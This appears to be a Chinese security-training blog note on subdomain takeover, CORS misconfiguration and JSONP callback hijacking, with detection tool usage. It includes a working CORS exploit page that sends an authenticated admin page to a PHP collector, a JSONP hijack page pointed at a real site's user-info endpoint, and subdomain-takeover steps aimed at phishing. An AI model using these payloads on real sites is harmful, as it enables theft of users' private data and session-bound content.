![1649116011643-70630d8d-9ba4-4c39-9561-7f11db84b851.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133921051-1760929239.png)

```plain
#知识点：
1、子域名接管-检测&探针&利用
2、COSP跨域资源-检测&探针&利用
3、JSONP跨域回调-检测&探针&利用

#前置知识点：
-同源策略(SOP)-“同源”包括三个条件：同协议 同域名 同端口
同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互,这是一个用于隔离潜在恶意文件的关键的安全机制.简单说就是浏览器的一种安全策略。
虽然同源策略在安全方面起到了很好的防护作用,但也在一定程度上限制了一些前端功能的实现,所以就有了许多跨域的手段。

http://www.xiaodi8.com
不属于同源：
https://www.xiaodi8.com
http://www.xiaodi9.com
http://www.xiaodi8.com:81
属于同源：
http://www.xiaodi8.com/xiaodi


-子域名接管：
域名解析记录指向域名，对应主机指向了一个当前未在使用或已经删除的特定服务，攻击者通过注册指向域名，从而控制当前域名的控制权，实现恶意软件分发、网络钓鱼/鱼叉式网络钓鱼、XSS 、身份验证绕过等。子域名接管不仅仅限于CNAME记录，NS,MX甚至A记录也会受到影响。
检测项目：
https://github.com/pwnesia/dnstake
https://github.com/anshumanbh/tko-subs
https://github.com/mhmdiaa/second-order
https://github.com/r3curs1v3-pr0xy/sub404
https://github.com/Echocipher/Subdomain-Takeover


-COSP跨域资源
CORS全称Cross-Origin Resource Sharing, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制，以使不同的网站可以跨域获取数据。
Access-Control-Allow-Origin：指定哪些域可以访问域资源。例如，如果requester.com想要访问provider.com的资源，那么开发人员可以使用此标头安全地授予requester.com对provider.com资源的访问权限。
Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送Cookie。
Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。此标头允许开发人员通过在requester.com请求访问provider.com的资源时，指定哪些方法有效来进一步增强安全性。
检测项目：https://github.com/chenjj/CORScanner


-JSONP跨域回调
JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。
检测项目：手工审查元素筛选或Burp项目
https://github.com/p1g3/JSONP-Hunter
```

- CORS资源跨域-敏感页面源码获取

------

```plain
复现步骤：
1、本地搭建访问页面跨域调用URL
2、受害者访问当前页面被资源共享

原理：
CORS（资源共享，建立在同源策略上）  只能做资源的获取
用户A在登录自己的后台或者页面，这个时候访问呢了第三方的页面的第三方页面去请求这个后台或者页面的内容，用户A访问了页面即将后台页面的内容泄露了

CSRF（如果有同源策略，那就会失效）操作添加用户
用户A在登录自己的后台或者页面，这个时候访问呢了第三方的页面的第三方页面去请求这个后台或者页面的内容，用户A访问了页面即将执行这个数据包。



产生原因：
index.php文件
Access-Control-Allow-Orign:*(标识其他页面能获取此页面的资源)（有漏洞）
Access-Control-Allow-Orign:http://www.xiaodi8.com(标识www.xiaodi8.com能获取此页面的资源，其他页面就不支持了。)（没有漏洞）

找这种漏洞，就是找设置问题，看不到
黑盒：Access-Control-Allow-Orign这个值是否设置后通过资源
在后台中博客是登录状态，http://127.0.0.1:8107/zb_system/admin/index.php

然后这时候管理员不小心触发了访问连接http://127.0.0.1:8107/cors.html
cors.html内容：

<!DOCTYPE>
<html>
<h1>cors exploit</h1>
<script type="text/javascript">
function exploit()
{
    var xhr1;
    var xhr2;
    if(window.XMLHttpRequest)
    {
        xhr1 = new XMLHttpRequest();
        xhr2 = new XMLHttpRequest();
    }
    else
    {
        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
        xhr2= new ActiveXObject("Microsoft.XMLHTTP");
    }
    xhr1.onreadystatechange=function()
    {
        if(xhr1.readyState == 4 && xhr1.status == 200) 
        {
            var datas=xhr1.responseText;
            xhr2.open("POST","http://127.0.0.1:8107/cors1.php","true");
            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
            xhr2.send("z0="+escape(datas));      
        }
    }
    xhr1.open("GET","http://127.0.0.1:8107/zb_system/admin/index.php","true") 
    xhr1.withCredentials = true;        
    xhr1.send();
}
exploit();
</script>
</html>

这个代码的意思是请求http://localhost:8107/zb_system/admin/index.php这个页面，把页面的内容发送给http://localhost:8107/cors1.php，cors1.php去接受这个页面资源。

cors1.php内容：

<?php

$file = fopen("secrect.html", "w+");
$res = $_POST['z0'];
fwrite($file, $res);
fclose($res);
?>
访问http://127.0.0.1:8107/cors.html
```

![1649118875974-417aa83a-73ee-4d35-9934-771f802c1589.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133924942-1139136099.png)

```html
会在当前目录生成一个secrect.html，然后这个secrect.html就是http://localhost:8107/zb_system/admin/index.php页面的资源。
访问：http://localhost:8107/secrect.html
```

![1649119217357-52b60f7c-b1c5-447e-b0d4-16ae24b92411.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133924745-1842903714.png)

- JSONP回调跨域-某牙个人信息泄露

------

```html
复现步骤：
1、登录某牙找到回调有敏感信息
2、本地搭建访问页面跨域调用URL
3、访问本地页面可获取当前某牙信息

产生原理：
支付接口
调用支付宝官方接口来判断是否支持成功
自己的网站域名是支付宝官方的域名吗？不是，属于不同源，不符合同源策略

除了支付接口，类似的登录接口等一系列都是这种回调。

大型网站这种同源策略有没有？（肯定有）
看数据包里面哪些有回调，看数据包有没有回调信息，看回调里面的敏感信息进行获取。

搜索callback，点击Preserve log
```

![1649121193236-2db24edc-37f7-4022-94c9-276bcafb4f93.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133924609-2129808532.png)

```html
在数据包中点击response（这个意思就是相当于访问了这个地址，然后有一些回调信息）

当访问个人资料的时候：访问地址：https://user.huya.com/user/getUserInfo?callback=jQuery17205956628992364452_1649121318647&uid=1259515769956
回调信息：jQuery17205956628992364452_1649121318647({"code":200,"data":{"uid":1259515769956,"avatar":"https://huyaimg.msstatic.com/avatar/1098/f5/f1d0e63d36c8ce1eb1e428c6306173_180_135.jpg?1565133598"},"message":"请求成功"})

其中https://huyaimg.msstatic.com/avatar/1098/f5/f1d0e63d36c8ce1eb1e428c6306173_180_135.jpg?1565133598这个就是头像地址
```

![1649121426892-5e536ce7-75e4-4a02-8bfa-d9afee5954e8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133925291-1359464145.png)

```html
把这个地址复制：https://user.huya.com/user/getUserInfo?callback=jQuery17205956628992364452_1649121318647&uid=1259515769956
构造一个html:

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP劫持测试</title>
</head>
<body>
<script type="text/javascript">
function callbackFunction(result)
        {
            alert(result.avatar);
        }
</script>
<script type="text/javascript" src="https://user.huya.com/user/getUserInfo?callback=jQuery17205956628992364452_1649121318647&uid=1259515769956"></script>
</body>
</html>

当有人去访问这个页面，这个页面可以放在任何网上上去，比如在本地访问，访问之后，就会有回显信息
```

![1649121728354-bd524157-881e-4ecd-b615-d1226af4f1ed.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133925413-1890639694.png)

```html
这样就获取到了图像信息等（个人信息）


用户A浏览器访问过huya,baidu.youku这种页面

攻击者：尝试去测试这些官方的回调页面（解决同源策略的安全问题）（不直接去请求有敏感信息的页面）
自己搭建在网站上面去触发代码，只要用户A访问了页面，相当于用户A就触发了回调，解决了同源策略的防护问题
从未得到了回调页面的内容

对于官方来讲：来源使攻击者的网站，不合法，同源策略防护阻止
回调第三方：官方认同的合法的，从哪里触发都可以了
```

- 子域名接管-瓜迪个人子域名劫持接管

------

```html
复现步骤：:xiaodi8.com 
1、通过检测cname获取指向
2、发现testxiaodi.fun过期受控
3、注册testxiaodi.fun实现控制

test.baidu.com设置了cname test.xxxx.com
如果这个时候 test.xxxx.com过期或者失效等
我们是不是注册这个域名，实现对test.baidu.com控制

在域名解析的时候，CNAME的记录类型是将一个域名指向另外一个域名
```

![1649122555290-d48f1e20-24b2-4271-8632-de9a562888b1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133925345-911030390.png)

```html
这个意思是：假如test.mumuxi8.com设置了cname，指向www.mumuxi666.com
而www.mumuxi666.com指向了地址47.100.167.248，这个时候，test.mumuxi8.com->www.mumuxi666.com-->47.100.167.248  相当于test.mumuxi8.com访问就是访问47.100.167.248这个域名。
假如这个www.mumuxi666.com过期了，然后攻击者注册了这个域名（这个域名被攻击者所有）然后在网页中制作与test.mumuxi8.com这个相识的钓鱼页面，那么访问test.mumuxi8.com这个域名，相当于访问了攻击者的域名。实现了对test.mumuxi8.com的控制。

需要留意这个www.mumuxi666.com这个域名有没有过期。
```

- 检测项目-CORS&JSONP&子域名接管

------

```html
1、python cors_scan.py -i top_100_domains.txt -t 100
2、人工排查+burpsuite 安装Jsonp_Hunter.py抓包使用
3、dnsub爬取子域名筛选接管
```

CORS

```html
cors检测项目：CORScanner-1.0.1
项目地址：https://github.com/chenjj/CORScanner

安装（用python38）
G:\python38\Scripts\pip.exe install -r requirements.txt
G:\python38\Scripts\pip.exe install corscanner
G:\python38\Scripts\pip.exe install cors

使用：
G:\python38\python.exe cors_scan.py
G:\python38\python.exe cors_scan.py -i top_100_domains.txt -t 100
```

![1649125497094-da2868df-b601-4124-996d-ad5085e33800.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133924889-304195510.png)

JSONP

```html
安装跟上次那个验证码识别差不多，不要再英文路径上安装
```

![1649126798531-f894eba6-46b9-48d9-9d19-d44b1550c576.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133924832-1501211372.png)

```html
安装完成后会出现JsonpHunter这个栏
当访问huya.com的时候，所有的回调会在在这里显示
```

![1649127016834-8769d38b-8c39-4e30-be97-9712216d6ada.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133925101-337691729.png)

子域名接管

```html
项目工具：dnsub_windows_amd64_v2.0
项目地址：http://github/yunxu1/dnsub

使用：dnsub_windows_amd64.exe -d http://xiaodi8.com
```

![1649127505390-a2662bd5-cbbf-41c3-a626-f6d30805c585.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913133925032-1044596126.png)